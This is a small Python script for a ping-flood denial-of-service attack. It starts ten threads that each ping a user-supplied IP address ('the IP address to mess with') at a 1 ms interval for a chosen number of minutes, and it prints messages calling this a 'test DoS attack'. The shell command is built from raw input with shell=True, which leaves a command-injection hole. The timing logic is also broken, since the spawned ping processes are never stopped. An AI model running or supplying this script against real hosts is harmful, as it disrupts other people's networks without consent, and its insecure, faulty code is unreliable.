import subprocess
import threading
import time

def send_ping(target_ip, interval):
    ping_command = f"ping -t -i {interval} {target_ip}"
    ping_process = subprocess.Popen(ping_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    target_ip = input("Enter the IP address to mess with: ")
    ping_interval = 0.001  # Set a small interval to simulate high traffic

    attack_duration_minutes = int(input("Enter the attack duration in minutes: "))
    attack_duration_seconds = attack_duration_minutes * 60

    print("Proceeding with test DoS attack...")

    threads = []
    for _ in range(10):  # Adjust the number of threads based on your testing requirements
        t = threading.Thread(target=send_ping, args=(target_ip, ping_interval))
        threads.append(t)
        t.start()

    try:
        time.sleep(attack_duration_seconds)
    except KeyboardInterrupt:
        
        print("\nDoS attack stopped by user.")
    finally:
        for t in threads:
            t.join()

        print("DoS attack simulation complete.")

if __name__ == "__main__":
    main()
